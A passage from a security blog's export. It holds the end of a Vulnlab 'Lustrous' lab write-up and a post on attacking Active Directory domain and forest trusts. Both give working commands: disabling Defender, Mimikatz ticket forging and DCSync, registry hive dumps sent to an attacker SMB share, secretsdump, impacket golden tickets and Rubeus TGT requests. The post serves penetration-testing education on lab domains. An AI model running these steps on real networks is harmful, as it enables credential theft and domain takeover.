class=\"line\">......</span><br><span class=\"line\">[...snip...]b3ba4bf7aba1a0dab346ec2bc2f1895636e7b32c585ece443cf97ab20fc8a767c4c42ad123540f1344e81ee2aea7649146acdae88c5ded877:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>We can guess based on the name of the account that this is the service account for the HTTP service - and given that now have access to that account, we can technically request a valid TGT to HTTP for any user on the domain.</p>\n<h1 id=\"Silver-Ticket-for-tony-ward\"><a href=\"#Silver-Ticket-for-tony-ward\" class=\"headerlink\" title=\"Silver Ticket for tony.ward\"></a>Silver Ticket for <code>tony.ward</code></h1><p>You can request it for any user - though if you look back at Bloodhound you’ll find interest in the <code>tony.ward</code> domain user. It seems that <code>tony.ward</code> is part of the <code>Backup Admins</code> group, which can hint at the fact that they might have <code>SeBackupPrivilege</code> enabled locally.</p>\n<p>So let’s try to request one as this user. We’ll do this from our RDP session as Administrator due to the fact that it should launch a separate PowerShell window when we generate a new logon through Mimikatz.</p>\n<p>Firstly though, we’ll need a few things to generate a Silver ticket for this user. I’ve compromised a list of what we’ll need and where you can find it below.</p>\n<ul>\n<li>Domain SID - We can find this in a few places, the easiest is in <code>AppData\\Roaming\\Microsoft\\Protect</code> in the Administrator’s home directory. Make sure to remove the <code>500</code> identifier at the end of it since that relates to the Administrator user.</li>\n<li>RC4 for SVC_WEB: We don’t have access to this, but we can generate an RC4 ticket online <a href=\"http://rc4.online-domain-tools.com/\">here</a>. We can use their password as both the input text and the key to generate the hash.</li>\n<li>ID for <code>tony.ward</code>: You can find this in Bloodhound in the user’s node underneath <code>Object ID</code>. Their ID should be <code>1114</code>.</li>\n</ul>\n<p>With that we can build out the command for Mimikatz, which will upload through Havoc. Remember to disable AV so that <code>mimikatz</code> isn’t blocked.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">01/06/2024 20:57:23 [5pider] Demon » powershell Set-MpPreference -DisableRealtimeMonitoring $true</span><br><span class=\"line\"></span><br><span class=\"line\">01/06/2024 20:58:48 [5pider] Demon » upload (LOCAL PATH)/mimikatz.exe</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then move back to the RDP session to execute <code>mimikatz</code> properly. This is due to some conflictions I ran into with Havoc, so we’ll run it on the RDP session in the meanwhile.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\Administrator\\Desktop&gt; .\\mimikatz.exe &quot;kerberos::golden /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /target:lusdc.lustrous.vl /service:HTTP /rc4:e67af8b3d78df5a02eb0d57b6cb60717 /user:tony.ward /id:1114 /target:lusdc.lustrous.vl /ptt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n\n<p>This should submit the Silver ticket for the current session that we are in. It will be say <code>Golden</code> ticket at the bottom but since we’re requesting it from the context of a service account, it’s a silver ticket.</p>\n<p>Let’s now try to authenticate to the web service in our <code>tony.ward</code> login session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(iwr http://lusdc.lustrous.vl/Internal -UseBasicParsing -UseDefaultCredentials).Content</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;td&gt;</span><br><span class=\"line\">Password Reminder</span><br><span class=\"line\">&lt;/td&gt;</span><br><span class=\"line\">&lt;td&gt;</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">&lt;/td&gt;</span><br><span class=\"line\">&lt;td&gt;</span><br><span class=\"line\">lustrous_tony.ward</span><br></pre></td></tr></table></figure>\n\n<p>As you can see in the above output, we have successfully gained the credentials to <code>tony.ward</code> by abusing Kerberos HTTP authentication! We can now attempt to enumerate the DC as this user.</p>\n<h1 id=\"Exploiting-SeBackupPrivilege-Remotely\"><a href=\"#Exploiting-SeBackupPrivilege-Remotely\" class=\"headerlink\" title=\"Exploiting SeBackupPrivilege Remotely\"></a>Exploiting SeBackupPrivilege Remotely</h1><p>You’ll notice relatively quickly that this user does not have RDP or WinRM access, though that isn’t an overly large issue.</p>\n<p>We made the assumption that we have <code>SeBackupPrivilege</code> enabled as this user due to the name of their <code>Backup Admins</code> group. Even though we can’t access the machine and get a shell, we can still exploit this privilege remotely.</p>\n<p>To do this, we’ll use <code>impacket-reg</code> to access the registry remotely and pull the SAM, SYSTEM, and SECURITY databases from the DC. I’ve also stood up a simple SMB server through <code>impacket-smbserver</code> so we can download them to our machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-smbserver smb share/ -smb2support</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-reg lustrous.vl/&#x27;tony.ward&#x27;:&#x27;U_cPVQqEI50i1X&#x27;@10.10.169.5 -dc-ip 10.10.169.5 backup -o \\\\\\\\(IP)\\\\smb</span><br></pre></td></tr></table></figure>\n\n<p>This may take some time, as the SYSTEM database is a really large file. I’ve also ran into a few NETBIOS timeouts when running this, feel free to do a bit of trial and error with this tool. There also is an alternative with <code>BackupOperatorToDA</code>, which will perform a similar action.</p>\n<p>Another note, I’ve had luck downloading the registry hives individually, you can do so with the below commands. Just make sure to wait a bit in between downloads so you don’t receive an invalid handle error.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-reg lustrous.vl/&#x27;tony.ward&#x27;:&#x27;U_cPVQqEI50i1X&#x27;@10.10.251.85 save -keyName &#x27;HKLM\\SAM&#x27; -o \\\\\\\\10.8.0.173\\\\smb_share</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-reg lustrous.vl/&#x27;tony.ward&#x27;:&#x27;U_cPVQqEI50i1X&#x27;@10.10.251.85 save -keyName &#x27;HKLM\\SECURITY&#x27; -o \\\\\\\\10.8.0.173\\\\smb_share</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-reg lustrous.vl/&#x27;tony.ward&#x27;:&#x27;U_cPVQqEI50i1X&#x27;@10.10.251.85 save -keyName &#x27;HKLM\\SECURITY&#x27; -o \\\\\\\\10.8.0.173\\\\smb_share</span><br></pre></td></tr></table></figure>\n\n<p>After it’s finished, you should have all three files in the respective directory you used for the SMB server. We can now use these three files to dump the machine account NTLM hash for <code>LUSDC$</code>. (Make sure to close out of your SMB server so you don’t receive a <code>read-length</code> error)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Target system bootKey: 0x9619c4c8e8d0c1e1314ca899f5573926</span><br><span class=\"line\">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class=\"line\">......</span><br><span class=\"line\">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>The NTLM hash for the <code>LUSDC$</code> has the username identifier <code>$MACHINE.ACC</code>. Although these names are different, this is the same user. Now that we have credentials to the machine account, we can use <code>impacket-secretsdump</code> once more to dump the Administrator user’s NTLM hash.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-secretsdump lustrous.vl/&#x27;LUSDC$&#x27;@lusdc.lustrous.vl -hashes aad3b435b51404eeaad3b435b51404ee:[...snip...] -just-dc-user Administrator</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)</span><br><span class=\"line\">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the Administrator’s NT hash, we can now use that to authenticate via WinRM to the DC!</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/j.jpg\"></p>\n<p>We can now access the Administrator’s Desktop directory to view the root flag, in <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>. This means we have successfully completed this chain!</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/k.jpg\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>I will say that despite needing to get a nudge from a few of the other writeups, I learned a lot from this chain. Like I said before, I didn’t know you could create silver tickets to HTTP or really a lot of other services. I know for next time I do an AD box similar to this, I’ll use this experience to check out a few other avenues. Big thanks to xct for the development of this machine - it helped me learn way more than I knew before.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href=\"https://github.com/BloodHoundAD/BloodHound\">https://github.com/BloodHoundAD/BloodHound</a><br><a href=\"https://github.com/HavocFramework/Havoc\">https://github.com/HavocFramework/Havoc</a><br><a href=\"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords\">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords</a><br><a href=\"https://github.com/ParrotSec/mimikatz\">https://github.com/ParrotSec/mimikatz</a><br><a href=\"https://github.com/skelsec/pypykatz\">https://github.com/skelsec/pypykatz</a><br><a href=\"https://thebinary0x1.medium.com/lustrous-vulnlab-walkthrough-f314f8b86134\">https://thebinary0x1.medium.com/lustrous-vulnlab-walkthrough-f314f8b86134</a><br><a href=\"https://vulndev.io/2021/12/27/lab-lustrous-walkthrough/\">https://vulndev.io/2021/12/27/lab-lustrous-walkthrough/</a><br><a href=\"https://docs.axway.com/bundle/axway-open-docs/page/docs/apigtw_kerberos/kerberos_overview/index.html#:~:text=Kerberos%20authentication%20based%20on%20Simple,are%20transmitted%20in%20HTTP%20headers\">https://docs.axway.com/bundle/axway-open-docs/page/docs/apigtw_kerberos/kerberos_overview/index.html#:~:text=Kerberos%20authentication%20based%20on%20Simple,are%20transmitted%20in%20HTTP%20headers</a>.<br><a href=\"https://learn.microsoft.com/en-us/dotnet/framework/wcf/feature-details/understanding-http-authentication\">https://learn.microsoft.com/en-us/dotnet/framework/wcf/feature-details/understanding-http-authentication</a><br><a href=\"https://github.com/dirkjanm/ldapdomaindump\">https://github.com/dirkjanm/ldapdomaindump</a><br><a href=\"http://rc4.online-domain-tools.com/\">http://rc4.online-domain-tools.com/</a><br><a href=\"https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets\">https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets</a></p>\n"},{"title":"Domain & Forest Trusts","date":"2024-06-06T02:35:44.000Z","keywords":"research, Active Directory, exploits","description":"I took inspiration from researching this topic from one of the recent machines that I wrote a writeup for, which you can find [here](https://dan-feliciano.com/writeups/trusted/) (you can probably get the interpretation from the name of the chain). The topic that I wanted to delve into today was the idea of Domain and Forest Trusts in an Active Directory environment. I tried getting a little creative with Lucidchart, as you'll see in the images to follow.","cover":"/images/research/domain-trusts/domain_trusts.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nI took inspiration from researching this topic from one of the recent machines that I wrote a writeup for, which you can find [here](https://dan-feliciano.com/writeups/trusted/) (you can probably get the interpretation from the name of the chain). The topic that I wanted to delve into today was the idea of Domain and Forest Trusts in an Active Directory environment. I tried getting a little creative with Lucidchart, as you'll see in the images to follow.\n\nI'll list a few topics that you'll need to understand before we delve into domain and forest trusts, as it just helps with practice to know what these mean.\n\n* **Domain Objects**: These are essentially exactly what they mean in the main - domain objects are any asset in a domain that serves a purpose. This can include users, services, machines, user properties; almost anything you can think of.\n* **KDC**: The KDC (Key Distribution Center) is the architecture at the center of Kerberos. When a domain object is requesting access to a resource, the KDC will grant it either a TGT (for login) or a TGS (for login to a service).\n* **Domain Dominance**: You'll probably hear this come up a lot in this post, it's essentially red-team terminology for compromising domains and using that domains privileges to compromise another (to however many domains is needed for the compromising procedure).\n* **SIDs**: These are essentially principal names that give domain objects their level of authority. They are denoted as long strings of text that start with `S-1-5`, and can vary based on the domain object. (For example, an Administrator's SID can be `S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-500`, where `500` represents their privilege level.)\n* **Child/Parent Domains**: You'll see me reference these two terms often. One domain is considered the parent domain (to which is allowed traffic towards the child domain) and the other is considered the child domain (to which the parent domain is allowing inbound traffic towards.)\n* **Bidirectional Trusts**: (Also called two-way trusts) This stems off of Child/Parent domains, in which both domains are considered the Parent and the Child. This is due to both domains trusting one another.\n* **Transitivity**: This essentially is a chain of trusts amongst domains. If Domain/Forest A trusts Domain/Forest B, and Domain/Forest B trusts Domain/Forest C, then that means that A also trusts C. Dependent on the owner of the domains, there can be various other properties that belong to this chain of trusts. \n\nFrom a non-technical level, domain trusts are essentially rulesets that allows one domain to authenticate and access certain resources in a different domain. This essentially works by allowing the traffic for authentication to flow between both domains. This involves utilizing the KDC to authorize the domain object access to the specific domain in question.\n\nThese trusts can either be `one-way` or `bidirectional`. Dependent on which domain is the trusting domain and which domain is the trusted domain, these one-way trusts can be labelled as `Inbound` or `Outbound`. This of course is in relation to the trusted domain that is able to access the trusting domains resources.\n\n![](/images/research/domain-trusts/b.jpg)\n\nIf a trust is `bidirectional` then that means that both domains trust one another - and both domains can access the resources of one another.\n\nFor forests, this works essentially the same way. If Forest A trusts on another Forest B, then Forest B will be able to access resources on Forest A (but not the other way around if it is a one-way trust!).\n\nTo bounce off of the topic of `transitivity` as we discussed earlier, domains/forests can be transitive or non-transitive. With a transitive entity, that same chain that I explained earlier (and in the image below) has transitivity enabled and multiple trusts can consist within that chain even if they aren't directly related to one-another. However, if a domain trust is `non-transitive`, then this chain of trusts does not exist and each domain only has trust rights to the domain that they are delegated to.\n\n![](/images/research/domain-trusts/c.jpg)\n\nThe image above entails a transitive domain trust, meaning that despite Domain A having a trust only on Domain B, that also means that it has a trust on Domain C since Domain B has a trust on Domain C.\n\nIn most cases, attackers exploit domain trusts by utilizing Kerberos. You may have heard of Kerberos terms such as `Silver`, `Golden`, or even `Diamond` tickets. I'll give a short outline to what we can do with these types of tickets, however I'd like to leave domain dominance to its own separate post at a later date.\n\n* **Silver Tickets**: A forged Kerberos service ticket that can be used to impersonate a computer account. These computer accounts are relative to services such as `MSSQL` or `IIS`.\n* **Golden Tickets**: A forged Kerberos service ticket that can be used to impersonate any user within the confines of the machine within the domain.\n* **Diamond Tickets**: Much similar to a golden ticket, except for the fact that the legitimate ticket that is issued is modified, and any TGS-REQs will have the relative AS-REQ before the request field.\n\nFor our specific case below, we'll be looking at different domain trusts and creating a `Golden` ticket for our study, as that's all we'll need. This can be leveraged by tools such as `mimikatz` or `Impacket`.\n\nNote that the environments that you'll see in the examples to follow are not real domains or environments to be awareness, and I do not own them in any capacity. I am merely providing these as examples as to what you might see in an environment.\n# Domain Trust Enumeration\n\nGenerally speaking, one of the common methods I've found to enumerating a domain trust is by utilizing `PowerView`. From a red-team aspect, the `PowerView` module can be picked up by your standard anti-virus whether that be AVs such as Defender or McAfee. It's essentially used to import modules into `PowerShell` that allow for further enumeration of domain objects in a domain, such as `groups`, `computers`, even `delegation` vulnerabilities.\n\nI've referenced the GitHub repository where you can find the script [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1). It's a part of the larger `PowerSploit` module, which is used for broad pen-testing tasks and can helpful in a variety of situations. If you're testing this locally, make sure to disable Windows Defender or create an exception for the `PowerView` script.\n\nNote that these examples I will be providing assume that we already have control over a domain denoted as `dan-feliciano.dev`. These \n\nTo enumerate domain trusts, we can use one of the modules present in `PowerSploit` to get the current domain trust present on the system we have access to.\n\n```\nPS C:\\Users\\daz\\Documents> Import-Module .\\PowerView.ps1\n\nPS C:\\Users\\daz\\Documents> Get-DomainTrust\n\nSourceName      : dan-feliciano.dev\nTargetName      : dan-feliciano.pro\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : \nTrustDirection  : Inbound\nWhenCreated     : 5/9/2024 6:25:43 PM\nWhenChanged     : 5/9/2024 6:38:25 PM\n```\n\nDue to the trust being inbound, this indicates to us that we have the authorization to grant domain objects access to the target domain `dan-feliciano.pro`. With this in mind, we can also begin to enumerate the domain through the trust using a different `PowerView` cmdlet.\n\nJust as a helpful tip to remember how this works - `dan-feliciano.dev` is the source of this trust, meaning that the trust direction is towards us. To reference this in a simpler sense, let says `dan-feliciano.dev` is Domain A and `dan-feliciano.pro` is Domain B. In our example, the trust direction is inbound from Domain B to Domain A, meaning (as Domain A) we have access to the resources in Domain B. Don't get confused with the `Inbound` entry in the domain trust output, as that is relative to the TRUST, not the ACCESS.\n\n```\nPS C:\\Users\\daz\\Documents> Get-DomainComputer -Domain dan-feliciano.pro -Properties DnsHostName\n\ndnshostname\n-----------      \ndc.dan-feliciano.pro\nfinance.dan-feliciano.pro\ndb.dan-feliciano.pro\ncorp.dan-feliciano.pro\nkiosk.dan-feliciano.pro\n```\n\nThis now tells us every workstation that is present within the domain, along with their DNS name. The process from here is trivial, dependent on what you would need to compromise for your red teaming procedure. In some cases, we may want to get access to the low-level `kiosk`, and in others we may want to look at the domain controller denoted as `dc.dan-feliciano.pro`.\n\nFrom here your attack can vary based on the trust that is present between the two domains. I'll go over all three different variants of these trusts and how to exploit them effectively.\n\n# Exploiting Inbound Trusts\n\nAs a preliminary example, let's assume that we're utilizing the same trust from the last section. This means that `dan-feliciano.dev` has a one-way inbound trust with the foreign domain `dan-feliciano.pro`.\n\nWe can exploit this using a few Impacket tools which are present by default on the latest versions of Kali Linux, so we'll use those to start. However we'll need a few assets in order to do this:\n\n* The `NTLM` hash of the `krbtgt` domain object on our current domain, `dan-feliciano.dev`.\n* The `dan-feliciano.dev` domain object SID.\n* The `dan-feliciano.pro` domain object SID.\n\nAs explained previously, the objects in our domain can be given access to any of the resources that are present in `dan-feliciano.pro`. We can start by getting the assets above and by enumerating a few of the objects on the remote domain such as the `Enterprise Admins` foreign group.\n\nTo start, we can grab both the `NTLM` hash and the `dan-feliciano.dev` domain SID by using `mimikatz` on the domain that we already control. If you haven't used `mimikatz` before, it's an extremely helpful tool used to dump domain information from registry in the post-exploitation phase of your red-teaming procedure. You can find the link to `mimikatz` in this GitHub repo [here](https://github.com/ParrotSec/mimikatz).\n\n```\nPS C:\\Users\\daz\\Documents> .\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /user:krbtgt /patch\" \"exit\"\n```\n\nThis output from `mimikatz` should give us both the NTLM hash of the `krbtgt` user along with the domain SID, to which I'll include in a list to prevent clutter.\n* `krbtgt` NTLM hash - `b84a08b41bd7e5e7f3708d0166d61bb1`\n* `DAZ - dan-feliciano.dev` domain SID - `S-1-5-21-878395754-674829726-1647362892`\n\nNext, we'll use another `PowerView` cmdlet that allows us to view the `Enterprise Admins` group amongst the foreign domain and all it's relative properties. The object that we're looking at is the `MemberName` entry, which should contain the respective SID that we're looking for.\n\n```\nPS C:\\Users\\daz\\Documents> Get-DomainForeignGroupMember -Domain dan-feliciano.pro\n\nGroupDomain             : dan-feliciano.pro\nGroupName               : Enterprise Admins\nGroupDistinguishedName  : CN=Enterprise,CN=Admins,CN=Builtin,DC=daz,DC=pro\nMemberDomain            : dan-feliciano.pro\nMemberName              : S-1-5-21-492758473-538291874-1904739281-519\nMemberDistinguishedName : CN=S-1-5-21-492758473-538291874-1904739281-519,CN=ForeignSecurityPrincipals,DC=daz,DC=pro\n```\n\nNow that we have all the information, we can progress with our exploit.\n\n```\ndaz@daz$ impacket-ticketer -nthash b84a08b41bd7e5e7f3708d0166d61bb1 -domain-sid S-1-5-21-878395754-674829726-1647362892 -extra-sid S-1-5-21-492758473-538291874-1904739281-519 -domain (trusting_domain) Administrator\n```\n\nThis will create an `Administrator.ccache` file in the directory that we are currently present in. This is a credential cache, which holds the credentials of the Kerberos ticket that we just crafted. Since this is specifically a golden ticket we created, we can use this as our authentication point to access the other domain.\n\nSince we're using Kerberos authentication, we'll also need to set the `KRB5CCNAME` global variable on Kali Linux to point to the `ccache` file we just created.\n\n```\ndaz@daz$ export KRB5CCNAME=Administrator.ccache\n```\n\nFinally, we'll need to run `PsExec` to establish a remote session to the workstation that we'd like to authenticate to. In our case, we're looking to authenticate as the `Administrator` user using the full FQDN of the machine. Remember to add the IP addresses and all the domain names you'll need in your `/etc/hosts` file.\n\n```\ndaz@daz$ impacket-psexec dan-feliciano.dev/Administrator@dc.dan-feliciano.pro -k -no-pass -target-ip (IP address of dc.dan-feliciano.pro)\n```\n\nAnd that should be all you'll need. A remote shell session should be established through `PsExec`, which will do all the needful and open a reverse shell for you. From my experience, this creates a session as `SYSTEM`, which is the highest-authoritative account you have access to on a workstation. From here, we can dump all the hashes and pivot to other workstations if we need to - or potentially compromise another domain!\n\n# Exploiting Outbound Trusts\n\nOutbound trusts work a little different, as the traffic is flowing in a different direction. In the last example, `dan-feliciano.dev` trusted `dan-feliciano.pro`, however what if this was an outbound trust?\n\n```\nPS C:\\Users\\daz\\Documents> Import-Module .\\PowerView.ps1\n\nPS C:\\Users\\daz\\Documents> Get-DomainTrust\n\nSourceName      : dan-feliciano.dev\nTargetName      : dan-feliciano.pro\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : \nTrustDirection  : Outbound\nWhenCreated     : 5/9/2024 9:46:13 PM\nWhenChanged     : 5/9/2024 9:52:58 PM\n```\n\nRemember, now that this is an outbound trust, `dan-feliciano.dev` is the domain that is trusting `dan-feliciano.pro`. This means that `dan-feliciano.pro` can access the resources on `dan-feliciano.dev`. The issue with this, is that we are in control of the trusting domain in this case, and we shouldn't be able to gain access to the trusted domain.\n\nDespite this, there are still ways to exploit this. Within a domain trust, there is a shared password that is automatically set to expire once every 30 days). This password is stored within a TDO, or Trusted Domain Object. Our main point of exploitation is the TDO, as these are stored within the `SYSTEM` machine that we currently have access to.\n\nWe can dump the keys used for the TDO using `mimikatz` on the domain controller, however we'll also need to find the GUID of the TDO which we currently have the ability to enumerate.\n\n```\nPS C:\\Users\\daz\\Documents> Get-DomainObject -Identity \"CN=dan-feliciano.pro,CN=System,DC=dan-feliciano,DC=dev\" | Select ObjectGuid\n\nobjectguid                          \n----------\nf5ksj19d-72rt-81lt-92d5-92jd27c109p2\n```\n\nNow that we have the GUID, we can dump the TDO using `mimikatz` and by performing a `dcsync`. What a DCSync will do in our case is have `mimikatz` act like a domain controller and dump all the credentials that it has access to on the current domain. Since we are supplying the GUID of the TDO, we can dump the respect `AES256`, `AES128`, and `RC4` hashes to the TDO.\n\n```\nPS C:\\Users\\daz\\Documents> .\\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:dan-feliciano.dev /guid:{f5ksj19d-72rt-81lt-92d5-92jd27c109p2}\" \"exit\"\n\n[DC] 'dan-feliciano.dev' will be the domain\n[DC] 'dc.dan-feliciano.dev' will be the DC server\n[DC] Object with GUID '{f5ksj19d-72rt-81lt-92d5-92jd27c109p2}'\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : dan-feliciano.pro\n\n** TRUSTED DOMAIN - Antisocial **\n\nPartner              : dan-feliciano.pro\n [ Out ] DAN-FELICIANO.PRO -> DAN-FELICIANO.DEV\n    * 5/9/2024 9:46:13 PM - CLEAR   - 58 0d 24 aa 1f f8 07 2c 2a d4 a8 cc 68 93 6e 20 5f ad 3b 32 e0 51 8e cc f0\n\t* aes256_hmac       1. b48fcf2e5e6cf31e6ee73d35e1409aa0a903c44c514e024d6a2a30701ec6\n\t* aes128_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0\n\t* rc4_hmac_nt       e1087fb17c8e5b4f29c4e1c0cb161481\n\n [Out-1] DAN-FELICIANO.PRO -> DAN-FELICIANO.DEV\n    * 5/9/2024 9:46:13 PM - CLEAR   - 58 0d 24 aa 1f f8 07 2c 2a d4 a8 cc 68 93 6e 20 5f ad 3b 32 e0 51 8e cc f0\n\t* aes256_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0a903c44c514e024d6a2a30701ec6\n\t* aes128_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0\n\t* rc4_hmac_nt       e1087fb17c8e5b4f29c4e1c0cb161481\n\n```\n\nIn this output, we see two passwords in their `AES256`, `AES128`, `RC4` values. We're focused on the primary `[Out]` key and not the `[Out-1]` key, however it isn't an issue in our situation because it hasn't been 30 days since the creation of this trust. If 30 days were to pass since this point, then the passwords for both `[Out]` and `[Out-1]` might be different.\n\nWhat makes these types of hashes so dangerous to use is that we can use them for Pass-the-Hash methods into Kerberos for a multitude of different use cases. You'll see that in the next part of the process, we'll use it to impersonate a user and interact with the domain however we'd like.\n\nThat being said, we have the hash for the TDO, but what user does it belong to? In our scenario, there are users called \"trust users\", which are essentially trusted accounts that have the ability to access resources over the domain trust. While the domain trust is outbound, the trusted domain still requires a trust user to use in order to properly access our domain's resources. This same trust user is present on the trusted domain, which we now have a hash for. We can discover valid trust users with another `PowerView` cmdlet, you can find an example of what you might see below.\n\n```\nPS C:\\Users\\daz\\Documents> Get-DomainUser -Identity * -Properties DisplayName, MemberOf | fl\n\ndisplayname : DAN\nmemberof    : {CN=Pro Users,CN=Users,DC=dan-feliciano,DC=pro}\n```\n\n* You can also use tools such as `ADSearch --search \"(objectCategory=user)\"` to discover valid machine accounts. Just for simplicities sake, we'll stick with `PowerView`.\n\nThis essentially tells us that there could be a valid trust account named `DAN$` amongst the `dan-feliciano.pro` domain.  Although we aren't able to confirm this since we can't access the any domain resources in the trusted domain, we can still attempt to try and determine if this is the right account. This is what makes this process semi-trivial, as we're essentially guessing whether or not this is a valid trust account.\n\nWe can use a tool called `Rubeus` to create a valid service ticket for the `DAN$` account. Rubeus is toolset that is used for Kerberos interaction and exploits, and it will assist in us being able to create TGTs and TGSs that we'll need in order to access the foreign domain.\n\n```\nPS C:\\Users\\daz\\Documents> .\\Rubeus.exe asktgt /user:DAN$ /domain:dan-feliciano.pro /rc4:e1087fb17c8e5b4f29c4e1c0cb161481 /nowrap\n\n[*] Action: Ask TGT\n\n[*] Using rc4_hmac hash: e1087fb17c8e5b4f29c4e1c0cb161481\n[*] Building AS-REQ (w/ preauth) for: 'dan-feliciano.pro\\DAN$'\n[*] Using domain controller: (DOMAIN CONTROLLER IP)\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n\t\tdoIHrK[...snip...]Yit98s\n```\n\nThis will return a TGT that we can now use on the remote domain, which can be used in a variety of situations. You can enumerate potential vectors with this TGT with tools such as `PowerSploit` or `ADSearch`. In some situations, we may be dealing with attacks such as constrained/unconstrained delegation, Kerberoasting, ASREPRoasting, or even ADCS. I look forward to creating future posts regarding these exploits in the future.\n\n# Bidirectional Trusts\n\nI don't plan on going specifically into an attack vector for `bidirectional` trust attacks, since you can essentially perform either of the trust attacks that were listed for inbound/outbound as explained above. I do however want to explain a few of the methods that can be used for this.\n\n```\nPS C:\\Users\\daz\\Documents> Import-Module .\\PowerView.ps1\n\nPS C:\\Users\\daz\\Documents> Get-DomainTrust\n\nSourceName      : dan-feliciano.dev\nTargetName      : dan-feliciano.pro\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : \nTrustDirection  : Bidirectional\nWhenCreated     : 5/9/2024 10:28:52 PM\nWhenChanged     : 5/9/2024 10:28:52 PM\n```\n\nEssentially this will tell us that both domains trust one another, and that both domains have access to each other's resources. We can perform a variety of attacks as explained above, or we can create `Golden` or `Diamond` tickets used to access each of the domains.\n\nIf we are a domain admin or have DA privileges in the child domain, this tells us that we also have DA privileges in the parent domain. This is through the idea of SID History, which (at a basic-level) causes the domains to share SIDs amongst the domain trust. The SID of the DA account we have access to will be inherited in the parent domain due to the bidirectional relationship.\n\nThat's essentially where `Golden` and `Diamond` tickets come into play, however I plan on leaving those for another post as I explained earlier. Domain dominance is a really interesting topic, and I am looking forward to researching more into it.\n\n# Conclusion\n\nBig thanks to RastaMouse and r0bit for getting me into this given the material that I've learned from. I encourage you all to progress through machines and chains on `Vulnlab`, as they really help with understanding Active Directory and Linux exploits; as well as just general red-team thinking.\n\n**Resources Used**\n\n* https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust\n* https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d\n* https://www.ibm.com/docs/en/db2/11.5?topic=windows-trust-relationships-between-domains\n* https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets\n* https://www.youtube.com/playlist?list=PLQbhlCtfsL39XMbLjmuu06hc1CIJsfuZ-*\n\n\n\n","source":"_posts/domain-trusts.md","raw":"---\ntitle: Domain & Forest Trusts\ndate: 2024-06-05 22:35:44\ntags: [research, Active Directory]\ncategories: research\nkeywords: 'research, Active Directory, exploits'\ndescription: I took inspiration from researching this topic from one of the recent machines that I wrote a writeup for, which you can find [here](https://dan-feliciano.com/writeups/trusted/) (you can probably get the interpretation from the name of the chain). The topic that I wanted to delve into today was the idea of Domain and Forest Trusts in an Active Directory environment. I tried getting a little creative with Lucidchart, as you'll see in the images to follow.\ncover: /images/research/domain-trusts/domain_trusts.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nI took inspiration from researching this topic from one of the recent machines that I wrote a writeup for, which you can find [here](https://dan-feliciano.com/writeups/trusted/) (you can probably get the interpretation from the name of the chain). The topic that I wanted to delve into today was the idea of Domain and Forest Trusts in an Active Directory environment. I tried getting a little creative with Lucidchart, as you'll see in the images to follow.\n\nI'll list a few topics that you'll need to understand before we delve into domain and forest trusts, as it just helps with practice to know what these mean.\n\n* **Domain Objects**: These are essentially exactly 